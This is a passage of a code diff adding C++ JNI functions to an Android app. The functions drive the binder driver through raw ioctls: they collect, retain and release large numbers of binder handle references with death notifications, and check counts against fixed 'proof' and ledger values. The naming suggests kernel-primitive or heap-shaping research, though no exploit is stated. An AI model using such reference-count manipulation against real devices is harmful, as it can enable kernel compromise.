+            }
+            std::uint8_t read_buffer[4096] {};
+            binder_write_read request {};
+            request.read_size = sizeof(read_buffer);
+            request.read_buffer = reinterpret_cast<binder_uintptr_t>(
+                    read_buffer);
+            if (ioctl(route.fd, BINDER_WRITE_READ, &request) != 0) {
+                if (errno == EINTR) {
+                    continue;
+                }
+                break;
+            }
+            for (std::size_t cursor = 0;
+                 cursor + sizeof(std::uint32_t) <= request.read_consumed;) {
+                std::uint32_t response = 0;
+                std::memcpy(&response, read_buffer + cursor,
+                        sizeof(response));
+                cursor += sizeof(response);
+                std::size_t payload_size = _IOC_SIZE(response);
+                if (cursor + payload_size > request.read_consumed) {
+                    cursor = request.read_consumed;
+                    break;
+                }
+                if (response == BR_TRANSACTION && payload_size >=
+                            sizeof(binder_transaction_data)) {
+                    binder_transaction_data transaction {};
+                    std::memcpy(&transaction, read_buffer + cursor,
+                            sizeof(transaction));
+                    bool target = transaction.code == kHolderCode &&
+                            transaction.target.ptr ==
+                                    route.callback_pointer &&
+                            transaction.cookie == route.callback_cookie &&
+                            !(transaction.flags & TF_ONE_WAY);
+                    std::uint32_t proof = 0;
+                    std::int32_t count = 0;
+                    if (target && transaction.data_size >=
+                                sizeof(proof) + sizeof(count) &&
+                            transaction.offsets_size ==
+                                    static_cast<binder_size_t>(expected_count) *
+                                            sizeof(binder_size_t)) {
+                        const auto* data =
+                                reinterpret_cast<const std::uint8_t*>(
+                                        transaction.data.ptr.buffer);
+                        std::memcpy(&proof, data, sizeof(proof));
+                        std::memcpy(&count, data + sizeof(proof),
+                                sizeof(count));
+                        const auto* offsets =
+                                reinterpret_cast<const binder_size_t*>(
+                                        transaction.data.ptr.offsets);
+                        std::set<std::uint32_t> unique_handles;
+                        std::vector<std::uint32_t> ordered_handles;
+                        ordered_handles.reserve(expected_count);
+                        bool objects = proof ==
+                                        static_cast<std::uint32_t>(
+                                                expected_proof) &&
+                                count == expected_count;
+                        for (int object_index = 0;
+                             objects && object_index < count;
+                             ++object_index) {
+                            binder_size_t object_offset =
+                                    offsets[object_index];
+                            if (object_offset > transaction.data_size ||
+                                    transaction.data_size - object_offset <
+                                            sizeof(flat_binder_object)) {
+                                objects = false;
+                                break;
+                            }
+                            flat_binder_object object {};
+                            std::memcpy(&object, data + object_offset,
+                                    sizeof(object));
+                            objects = object.hdr.type ==
+                                            BINDER_TYPE_HANDLE &&
+                                    unique_handles.insert(object.handle).second;
+                            if (objects) {
+                                ordered_handles.push_back(object.handle);
+                            }
+                        }
+                        std::set<std::uint32_t> retained_handles(
+                                route.holder_handles.begin(),
+                                route.holder_handles.end());
+                        for (std::uint32_t handle : ordered_handles) {
+                            objects = objects &&
+                                    retained_handles.insert(handle).second;
+                        }
+                        if (objects && unique_handles.size() ==
+                                    static_cast<std::size_t>(count)) {
+                            constexpr std::size_t kHandleCommandSize =
+                                    sizeof(std::uint32_t) +
+                                    sizeof(std::uint32_t);
+                            constexpr std::size_t kReplyCommandSize =
+                                    sizeof(std::uint32_t) +
+                                    sizeof(binder_transaction_data);
+                            constexpr std::size_t kFreeCommandSize =
+                                    sizeof(std::uint32_t) +
+                                    sizeof(binder_uintptr_t);
+                            constexpr std::size_t kDeathCommandSize =
+                                    sizeof(std::uint32_t) +
+                                    sizeof(binder_handle_cookie);
+                            bool request_death = death_index >= 0;
+                            std::vector<std::uint8_t> acquire_commands(
+                                    ordered_handles.size() * 2 *
+                                            kHandleCommandSize +
+                                    kReplyCommandSize + kFreeCommandSize +
+                                    (request_death
+                                            ? kDeathCommandSize : 0));
+                            std::size_t command_offset = 0;
+                            for (std::uint32_t handle : ordered_handles) {
+                                write_command(acquire_commands.data() +
+                                                command_offset,
+                                        BC_INCREFS, &handle, sizeof(handle));
+                                command_offset += kHandleCommandSize;
+                                write_command(acquire_commands.data() +
+                                                command_offset,
+                                        BC_ACQUIRE, &handle, sizeof(handle));
+                                command_offset += kHandleCommandSize;
+                            }
+                            binder_handle_cookie death {};
+                            if (request_death) {
+                                death.handle = ordered_handles[death_index];
+                                death.cookie = UINT64_C(0x5244480000000000) |
+                                        static_cast<binder_uintptr_t>(index);
+                                write_command(acquire_commands.data() +
+                                                command_offset,
+                                        BC_REQUEST_DEATH_NOTIFICATION,
+                                        &death, sizeof(death));
+                                command_offset += kDeathCommandSize;
+                            }
+                            binder_uintptr_t incoming_buffer =
+                                    transaction.data.ptr.buffer;
+                            write_command(acquire_commands.data() +
+                                            command_offset,
+                                    BC_FREE_BUFFER, &incoming_buffer,
+                                    sizeof(incoming_buffer));
+                            command_offset += kFreeCommandSize;
+                            std::int32_t reply_data[2] {0, expected_proof};
+                            binder_transaction_data reply {};
+                            reply.data_size = sizeof(reply_data);
+                            reply.data.ptr.buffer =
+                                    reinterpret_cast<binder_uintptr_t>(
+                                            reply_data);
+                            write_command(acquire_commands.data() +
+                                            command_offset,
+                                    BC_REPLY, &reply, sizeof(reply));
+                            command_offset += kReplyCommandSize;
+                            bool completed = command_offset ==
+                                            acquire_commands.size() &&
+                                    write_binder_commands(
+                                    route.fd, acquire_commands.data(),
+                                    acquire_commands.size()) == 0;
+                            if (completed) {
+                                route.holder_handles.insert(
+                                        route.holder_handles.end(),
+                                        ordered_handles.begin(),
+                                        ordered_handles.end());
+                                if (request_death) {
+                                    route.death_notifications.push_back(
+                                            death);
+                                }
+                                handles += count;
+                                completions +=
+                                        drain_raw_transaction_complete(
+                                                route.fd) ? 1 : 0;
+                                found = true;
+                            }
+                        }
+                    }
+                }
+                cursor += payload_size;
+            }
+        }
+        if (!found) {
+            failed_index = static_cast<int>(index);
+            break;
+        }
+        ++received;
+    }
+    bool pass = received == expected_holders &&
+            handles == expected_handles && completions == expected_holders;
+    auto duration = std::chrono::duration_cast<std::chrono::microseconds>(
+            std::chrono::steady_clock::now() - started).count();
+    char state[320];
+    std::snprintf(state, sizeof(state),
+            "status=%s stage=raw-binder-holder-refs requested=%d"
+            " received=%d mode=%s fixed_refs=%d proof=%08" PRIx32
+            " filler_range=%" PRId32 "-%" PRId32
+            " handles=%d expected_handles=%d completions=%d"
+            " death_index=%d"
+            " failed_index=%d"
+            " duration_us=%" PRId64,
+            pass ? "pass" : "fail", expected_holders, received,
+            dynamic_counts ? "controlled" : "prime",
+            fixed_refs_per_holder,
+            static_cast<std::uint32_t>(expected_proof),
+            kFillerMinimum, kFillerMinimum + kFillerVariants - 1,
+            handles, expected_handles, completions, death_object_index,
+            failed_index,
+            static_cast<std::int64_t>(duration));
+    return environment->NewStringUTF(state);
+}
+
+extern "C" JNIEXPORT jstring JNICALL
+Java_com_vandam_prism_NativeBridge_releaseRawBinderHolderHandles(
+        JNIEnv* environment, jclass, jint expected_handles,
+        jint expected_deaths) {
+    std::lock_guard<std::mutex> lock(g_holder_cohort_mutex);
+    prism::primitive::Result result;
+    if (g_holder_cohort != nullptr && expected_handles > 0 &&
+            expected_deaths >= 0) {
+        result = g_holder_cohort->release_handles(
+                expected_handles, expected_deaths);
+    }
+    bool ledger = false;
+    if (result.passed) {
+        std::lock_guard<std::mutex> isolated_lock(g_raw_isolated_mutex);
+        ledger = g_raw_isolated_state ==
+                        IsolatedRetirementState::kCollecting &&
+                g_raw_isolated_generation > 0 &&
+                expected_handles == 520 && expected_deaths == 8;
+        if (ledger) {
+            g_raw_isolated_state =
+                    IsolatedRetirementState::kReferencesReleased;
+        } else {
+            g_raw_isolated_state = IsolatedRetirementState::kFailed;
+        }
+    }
+    bool pass = result.passed && ledger;
+    char state[384];
+    std::snprintf(state, sizeof(state),
+            "status=%s stage=raw-binder-holder-handle-release core=[%s]",
+            pass ? "pass" : "fail",
+            result.detail.empty() ? "status=fail reason=cohort" :
+                    result.detail.c_str());
     return environment->NewStringUTF(state);
 }
